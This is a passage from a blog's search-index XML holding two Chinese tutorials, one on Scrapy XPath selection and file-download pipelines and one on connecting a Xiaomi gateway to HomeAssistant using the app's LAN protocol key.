href="#查找文本包含指定值的标签" class="headerlink" title="查找文本包含指定值的标签"></a>查找文本包含指定值的标签</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.xpath(&#39;a[contains(text(), &quot;xxx&quot;)]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>当获取到标签之后，可以通过 <code>get()</code> , <code>getall()</code> 等方法提取需要的信息，或者在此基础上再进行标签的获取</p><h2 id="文件-amp-图片下载"><a href="#文件-amp-图片下载" class="headerlink" title="文件&amp;图片下载"></a>文件&amp;图片下载</h2><p>有些时候我们希望爬虫不仅爬取文字信息，也要下载图片&amp;文件内容到本地，这个时候就需要用到<code>scrapy.pipelines.FilesPipeline</code>和<code>scrapy.pipelines.ImagePipeline</code> 了，它们分别定义了文件管道和图片管道。传统的下载方式是在<code>parse</code> 的时候加入下载链接到<code>item</code>中，然后调用下载函数（如<code>cptools.process.download_file</code>）指定下载并存储，但这种下载方式是阻塞式的，用<code>pipeline</code>的好处是可以异步下载，提高效率，主要的步骤如下：</p><ol><li>定义一个<code>Item</code>（可以是原本已有的），添加两个字段<code>files</code>,<code>file_urls</code>，后者是下载链接的列表（即一次可传入多个下载链接），前者是文件下载完成后存储的下载相关信息（如下载路径、url、校验码等）</li><li>在<code>settings.py</code> 中设置变量<code>FILES_STORE</code>即存储路径，之后下载的内容都会存储在这个路径下，最终结果是<code>FILES_STORE/full/3afec3b4765f8f0a07b78f98c07b83f013567a0a</code>(最后一串是文件的sha1值命名的文件)</li><li>在<code>settings.py</code>中启动<code>pipeline</code>：即<code>scrapy.pipelines.files.FilesPipeline:1</code> </li></ol><p>下面是一个例子：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># items.py</span><span class="token keyword">class</span> <span class="token class-name">SFItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 固件名称</span>    <span class="token comment"># 下载信息存储，下面字段必要</span>    file_urls <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># spiders</span><span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>item <span class="token operator">=</span> SFItem<span class="token punctuation">(</span><span class="token punctuation">)</span>    item<span class="token punctuation">[</span><span class="token string">'file_urls'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"https://download_url.zip"</span><span class="token punctuation">]</span>   <span class="token comment"># 注意要列表传入</span>    <span class="token keyword">yield</span> item    <span class="token comment"># settings.py</span>ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'IndustryInfoCrawler.pipelines.SFFilesPipeline'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>   <span class="token string">'IndustryInfoCrawler.pipelines.MongoPipeline'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>FILES_STORE <span class="token operator">=</span> <span class="token string">'root'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>上面的方式基本满足了对文件的下载操作，但有两点问题：</p><ol><li><p>下载路径我们只定义了根目录，如果我们相对文件分类，那怎么办</p></li><li><p>文件名sha1值是为了不重复，但可读性很差，我们希望能够自定义文件名</p></li></ol></blockquote><p>解决办法通过重写<code>Pipeline</code>实现，样例如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>pipelines<span class="token punctuation">.</span>images <span class="token keyword">import</span> FilesPipeline<span class="token keyword">class</span> <span class="token class-name">SFFilesPipeline</span><span class="token punctuation">(</span>FilesPipeline<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    自定义下载管道    """</span>    <span class="token keyword">def</span> <span class="token function">get_media_requests</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> file_url <span class="token keyword">in</span> item<span class="token punctuation">[</span><span class="token string">'file_urls'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>  <span class="token comment"># 请求下载</span>    <span class="token keyword">def</span> <span class="token function">file_path</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> item<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment"># parent = super().file_path(request, response, info)  # 获取父类目录</span>        SF_path <span class="token operator">=</span>  <span class="token string">'SF'</span> <span class="token comment"># 在这里自定义存储的目录，也可以根据不同文件类型，自己设置分类目录</span>        filename <span class="token operator">=</span> <span class="token string">'test.zip'</span>        <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>SF_path<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>  <span class="token comment"># 返回结果为文件存储路径，最终结果是在根目录下存储`FILES_STORE/SF_PATH/filename`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>文件到期：很多时候我们不希望重复对本地已有的文件进行下载操作，可以自定义下载管道中请求的时候检查本地文件是否存在，也可以通过设置文件到期时间（未到期的文件不会重复下载）</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># settings.py</span><span class="token comment"># 120 days of delay for files expiration</span>FILES_EXPIRES <span class="token operator">=</span> <span class="token number">120</span><span class="token comment"># 30 days of delay for images expiration</span>IMAGES_EXPIRES <span class="token operator">=</span> <span class="token number">30</span><span class="token comment"># 如果存在自定义的文件管道，如上面的SFFilesPipeline，可以对单个子类管道设置到期时间，以子类名称大写开头</span>SFFILESPIPELINE_FILES_EXPIRES <span class="token operator">=</span> <span class="token number">120</span>   <span class="token comment"># 120天内不重复下载通过SFFilesPipeline的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>还有一个注意点是，当下载文件过大，超出scrapy预期的话，会报警告，可以通过在<code>settings.py</code>中设置<code>DOWNLOAD_WARNSIZE = 0</code>去除</p></blockquote><ul><li><a href="https://blog.csdn.net/Zhihua_W/article/details/105200916">https://blog.csdn.net/Zhihua_W/article/details/105200916</a></li><li><a href="https://blog.csdn.net/weixin_43343144/article/details/87908448">https://blog.csdn.net/weixin_43343144/article/details/87908448</a></li><li><a href="https://scrapy-docs.readthedocs.io/zh/latest/topics/media-pipeline.html?highlight=%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">https://scrapy-docs.readthedocs.io/zh/latest/topics/media-pipeline.html?highlight=%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>scrapy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【IoT智能家居】米家网关接入HomeAssistant</title>
    <link href="/article/8460.html"/>
    <url>/article/8460.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段实际需要搭建一个智能家居环境场景使用，为了能够同时接入多个厂商的设备，需要用一个开放的IoT平台，常见的有</p><ul><li><code>IFTTT</code>：允许不同厂商平台的app接入，创建规则实现智能操作，但不支持许多国产的厂商，如小米、华为。</li><li><code>HomeAssistant</code>：用<code>python</code>编写的一个可以本地化部署的开放平台，允许接入的厂商和设备类型非常多，其中就包含<code>小米</code>。</li><li><code>OpenHAB</code>:与<code>HomeAssistant</code>类似，属于国外的开放平台。</li></ul><p>由于本人处于国内，经过斟酌分析，<code>HomeAssistant</code>的可实现性最大，资料也最全。但是在购买米家的设备接入<code>HA</code>的时候却出现了问题。本人在搜集各类资料和实践的过程中也踩了很多坑，浪费了很多时间，因此撰写该文，希望帮助其他人快速解决米家网关接入HA的问题。</p><blockquote><p>本文主要解决实际操作过程中遇到的问题，更新时间为<code>20/07/14</code>。具体怎么安装<code>HA</code>，网上已有许多教程，这里不多赘述。</p></blockquote><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><p>先提供一个较为官方的<a href="https://home-assistant.cc/component/xiaomi/zigbee/">中文文档</a>，许多操作可以在这里找到。</p><h2 id="网关局域网通信协议的获取"><a href="#网关局域网通信协议的获取" class="headerlink" title="网关局域网通信协议的获取"></a>网关局域网通信协议的获取</h2><p>当你搜索米家网关接入<code>HomeAssistant</code>时，现在网上有的方案包括官方文档、个人博客，主要包含以下：</p><ul><li><a href="https://www.jiaheu.com/topic/258031.html">小米老多功能网关接入HA</a>:这种文章最多，且年代比较久远，一般是17，18年的。限制要求是米家网关必须是老版的多功能网关(非现售的智能多模网关)，上面有很多孔的，且对米家app的要求是老版本<code>5.0.19</code>以前。如果你手上是<a href="https://item.jd.com/100010622778.html">多模智能网关</a>，就退货吧</li></ul><h2 id="修改configuration-yaml添加设备"><a href="#修改configuration-yaml添加设备" class="headerlink" title="修改configuration.yaml添加设备"></a>修改<code>configuration.yaml</code>添加设备</h2><p>搜索到的资料大多以修改<code>configuration.yaml</code>文件的方式来添加设备，类似下面：<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">xiaomi_aqara:  gateways:    #此处填写Aqara空调伴侣的mac地址，去掉中间的：    - mac: 7E49EAB4EC68    #此处填写第二步获得的key      key: ***************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>实际上可以通过<code>HA</code>控制面板直接添加。具体步骤包含：</p><blockquote><p>前提是你的网关设备已经开启，请在米家app中确保能连接上。</p></blockquote><ul><li>按照下图选项添加设备<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114700.png" alt="image-20210328114700842" style="zoom:33%;" /></li><li>在搜索栏中搜索xiaomi，选择网关<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114719.png" alt="image-20210328114719287" style="zoom: 33%;" /></li><li>按照步骤点击即可，HA会自动发现局域网内的米家网关</li><li>添加完成后，所有联入小米网关的设备都会在<code>HA</code>中显示.<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114730.png" alt="image-20210328114730867" style="zoom:33%;" /></li></ul><h1 id="设备与app选择"><a href="#设备与app选择" class="headerlink" title="设备与app选择"></a>设备与app选择</h1><p>经过本人测试，能够接入<code>HA</code>的小米网关（必须要获取到<strong>局域网通信协议密钥</strong>）有两种：</p><ul><li>老版多功能网关，目前在各大电商均已断货，可以在闲鱼上购买二手设备。<br>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114748.png" alt="image-20210328114747988" style="zoom:33%;" /></li><li>空调伴侣(升级版)带网关:<a href="https://item.jd.com/100007226867.html">京东链接</a></li></ul><p>而对于米家app，经过我实际测试下来，除非想要按照老版本的获取网关的方式，即便是现在最新版(<code>5.7.5</code>)也可以在上述的网关中获取到<strong>局域网通信协议密钥</strong>。</p><p>我这里以<strong>空调伴侣网关</strong>为例：</p><ol><li>用米家app连接空调伴侣，进入选择网关，点击右上角三个点<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114803.png" alt="image-20210328114803567" style="zoom: 25%;" /></li><li>选择功能设置，然后狂点下面的插件版本，即可看到局域网通信协议<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114852.png" alt="image-20210328114852542" style="zoom: 50%;" /></li><li>进入局域网通信协议，选择开启，记住相应密码，点击确定<br> <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210328114916.png" alt="image-20210328114916794" style="zoom: 50%;" /></li></ol><p>当获取到局域网通信密钥后，就可以通过<code>HA</code>的添加设备面板按照流程添加米家的网关了，一旦网关添加成功，接入该网关的设备也会显示。</p>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
      <tag>HomeAssistant</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
